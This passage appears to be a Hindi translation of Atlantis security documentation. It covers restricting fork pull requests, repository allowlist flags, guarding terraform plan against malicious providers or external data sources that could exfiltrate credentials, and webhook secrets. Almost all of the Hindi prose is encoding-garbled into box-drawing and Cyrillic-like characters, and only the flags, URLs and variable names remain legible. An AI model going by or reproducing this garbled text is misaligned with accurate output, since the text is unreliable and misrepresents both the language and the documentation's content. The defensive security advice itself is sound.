рдпрджрд┐ рдЖрдк рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рд░реЗрдкреЛ рдкрд░ рдЪрд▓рд╛ рд░рд╣реЗ рд╣реИрдВ (рдЬрд┐рд╕реЗ рд╕рд┐рдлрд╛рд░рд┐рд╢ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдКрдкрд░ рджреЗрдЦреЗрдВ) рддреЛ рдЖрдкрдХреЛ `--allow-fork-prs` (рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдЕрд╕реНрд╡реАрдХреГрдд) рд╕реЗрдЯ рдирд╣реАрдВ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП рдХреНрдпреЛрдВрдХрд┐ рдХреЛрдИ рднреА рдЕрдкрдиреЗ рдлреЛрд░реНрдХ рд╕реЗ рдЖрдкрдХреЗ рд░реЗрдкреЛ рдореЗрдВ рдкреБрд▓ рдЕрдиреБрд░реЛрдз рдЦреЛрд▓ рд╕рдХрддрд╛ рд╣реИред

### `--repo-allowlist` <a href="#repo-allowlist" id="repo-allowlist"></a>

рдПрдЯрд▓рд╛рдВрдЯрд┐рд╕ рдЖрдкрдХреЛ `--repo-allowlist` рдлреНрд▓реИрдЧ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╡реЗрдмрд╣реБрдХ рд╕реЗ рдЖрдиреЗ рд╡рд╛рд▓реЗ рд░реЗрдкреЛрдЬрд╝ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдЕрдиреБрдорддрд┐ рд╕реВрдЪреА рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП:

* рд╡рд┐рд╢рд┐рд╖реНрдЯ рд░реЗрдкреЛрдЬрд╝рдЯрд░реА: `--repo-allowlist=github.com/runatlantis/atlantis,github.com/runatlantis/atlantis-tests`
* рдЖрдкрдХрд╛ рд╕рдВрдЧрдарди рд╕рднреА: `--repo-allowlist=github.com/runatlantis/*`
* рдЖрдкрдХреЗ GitHub рдПрдВрдЯрд░рдкреНрд░рд╛рдЗрдЬ рдЗрдВрд╕реНрдЯреЙрд▓ рдореЗрдВ рд╣рд░ рд░реЗрдкреЛ: `--repo-allowlist=github.yourcompany.com/*`
* рд╕рднреА рд░реЗрдкреЛрдЬрд╝рдЯрд░реА: `--repo-allowlist=*`. рдЬрдм рдЖрдк рд╕рдВрд░рдХреНрд╖рд┐рдд рдиреЗрдЯрд╡рд░реНрдХ рдореЗрдВ рд╣реЛ рддреЛ рдЙрдкрдпреЛрдЧреА рд╣реИ рд▓реЗрдХрд┐рди рдПрдХ рд╡реЗрдмрд╣реБрдХ рд╕реАрдХреНрд░реЗрдЯ рднреА рд╕реЗрдЯ рдХрд┐рдП рдмрд┐рдирд╛ рдЦрддрд░рдирд╛рдХ рд╣реИред

рдпрд╣ рдлреНрд▓реИрдЧ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдЖрдкрдХрд╛ рдПрдЯрд▓рд╛рдВрдЯрд┐рд╕ рд╕реНрдерд╛рдкрдирд╛ рдЙрди рд░реЗрдкреЛрдЬрд╝рдЯрд░реАрдЬрд╝ рдХреЗ рд╕рд╛рде рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИ рдЬрд┐рдиреНрд╣реЗрдВ рдЖрдк рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рддреЗ рд╣реИрдВред рдЕрдзрд┐рдХ рд╡рд┐рд╡рд░рдг рдХреЗ рд▓рд┐рдП `atlantis server --help` рджреЗрдЦреЗрдВред

### рдЯреЗрд░рд╛реЮреЙрд░реНрдо рдкреНрд▓рд╛рдирд┐рдВрдЧ рдХреА рд╕реБрд░рдХреНрд╖рд╛ <a href="#protect-terraform-planning" id="protect-terraform-planning"></a>

рдпрджрд┐ рд╣рдорд▓рд╛рд╡рд░ рдкреБрд▓ рдЕрдиреБрд░реЛрдз рдЬрдорд╛рддреЗ рд╣реИрдВ рдЬрд┐рд╕рдореЗрдВ рджреБрд░реНрднрд╛рдЧреНрдпрдкреВрд░реНрдг рдЯреЗрд░рд╛реЮреЙрд░реНрдо рдХреЛрдб рд╣реИ рддреЛ рдЖрдкрдХреЛ рдзреНрдпрд╛рди рджреЗрдирд╛ рдЪрд╛рд╣рд┐рдП рдХрд┐ `terraform apply` рдордВрдЬреВрд░рд┐рдпрд╛рдБ рдкрд░реНрдпрд╛рдкреНрдд рдирд╣реАрдВ рд╣реИрдВред рдПрдХ [`external` рдбреЗрдЯрд╛ рд╕реНрд░реЛрдд](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/data\_source) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдпрд╛ рдПрдХ рджреБрд░реНрднрд╛рдЧреНрдпрдкреВрд░реНрдг рдкреНрд░реЛрд╡рд╛рдЗрдбрд░ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рдХреЗ `terraform plan` рдореЗрдВ рджреБрд░реНрднрд╛рдЧреНрдпрдкреВрд░реНрдг рдХреЛрдб рдЪрд▓рд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕ рдХреЛрдб рдлрд┐рд░ рдЖрдкрдХреЗ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреЛ рдмрд╛рд╣рд░ рд▓реЗ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рдЗрд╕реЗ рд░реЛрдХрдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдк рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

1. рдПрдЯрд▓рд╛рдВрдЯрд┐рд╕ рдЗрдореЗрдЬ рдпрд╛ рд╣реЛрд╕реНрдЯ рдореЗрдВ рдкреНрд░реЛрд╡рд╛рдЗрдбрд░реНрд╕ рдХреЛ рдмреЗрдХ рдХрд░реЗрдВ рдФрд░ рдЙрддреНрдкрд╛рджрди рдореЗрдВ рдирд┐рд╖реЗрдз рджреЗрдВред
2. рдкреНрд░реЛрд╡рд╛рдЗрдбрд░ рд░рдЬрд┐рд╕реНрдЯреНрд░реА рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХреЛ рдЖрдВрддрд░рд┐рдХ рд░реВрдк рд╕реЗ рд▓рд╛рдЧреВ рдХрд░реЗрдВ рдФрд░ рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдирд┐рд╖реЗрдз рджреЗрдВ, рдЗрд╕ рддрд░рд╣ рдЖрдк рдирд┐рдпрдВрддреНрд░рдг рдореЗрдВ рд░рдЦреЗрдВрдЧреЗ рдХрд┐рд╕рдХреЗ рдкрд╛рд╕ рд░рдЬрд┐рд╕реНрдЯреНрд░реА рдХреЛ рд▓рд┐рдЦрдиреЗ рдХреА рдкрд╣реБрдВрдЪ рд╣реИред
3. рдЕрдкрдиреЗ [рд╕рд░реНрд╡рд░-рд╕рд╛рдЗрдб рд░реЗрдкреЛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди](https://www.runatlantis.io/docs/server-side-repo-config.html) рдХреА `plan` рдЪрд░рдг рдХреЛ рдЕрд╡реИрдз рдкреНрд░реЛрд╡рд╛рдЗрдбрд░ рдпрд╛ рдбреЗрдЯрд╛ рд╕реНрд░реЛрдд рдХреЗ рдЙрдкрдпреЛрдЧ рдХреЗ рдЦрд┐рд▓рд╛рдл рдорд╛рдиреНрдпрддрд╛ рджреЗрдиреЗ рдХреЗ рд▓рд┐рдП рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдмрджрд▓реЗрдВ рдпрд╛ рдирд┐рд╖реЗрдзрд┐рдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рд╕реЗ рдкреАрдЖрд░ рдХрд░реЗрдВред рдЖрдк рдЗрд╕ рдмрд┐рдВрджреБ рдкрд░ рдЕрддрд┐рд░рд┐рдХреНрдд рдорд╛рдиреНрдпрддрд╛ рднреА рдЬреЛрдбрд╝ рд╕рдХрддреЗ рд╣реИрдВ, рдЬреИрд╕реЗ рдХрд┐ `plan` рдХреЛ рдЬрд╛рд░реА рдХрд░рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рдкреАрдЖрд░ рдкрд░ "рдердореНрд╕-рдЕрдк" рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ред рдпрд╣рд╛рдВ рдХреЙрдиреНрдлрд╝реЗрд╕реНрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

### рд╡реЗрдмрд╣реБрдХ рд╕реАрдХреНрд░реЗрдЯреНрд╕ <a href="#webhook-secrets" id="webhook-secrets"></a>

рдПрдЯрд▓рд╛рдВрдЯрд┐рд╕ рдХреЛ рд╡реЗрдмрд╣реБрдХ рд╕реАрдХреНрд░реЗрдЯреНрд╕ рдХреЗ рд╕рд╛рде рдЪрд▓рд╛рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП рдЬреЛ `$ATLANTIS_GH_WEBHOOK_SECRET`/`$ATLANTIS_GITLAB_WEBHOOK_SECRET` рдПрдирд╡рд╛рдпрд░рдореЗрдВрдЯ рд╡реЗрд░рд┐рдПрдмрд▓реНрд╕ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕реЗрдЯ рдХрд┐рдП рдЧрдП рд╣реЛрдВред `--repo-allowlist` рдлреНрд▓реИрдЧ рд╕реЗрдЯ рдХрд┐рдП рдмрд┐рдирд╛, рд╡реЗрдмрд╣реБрдХ рд╕реАрдХреНрд░
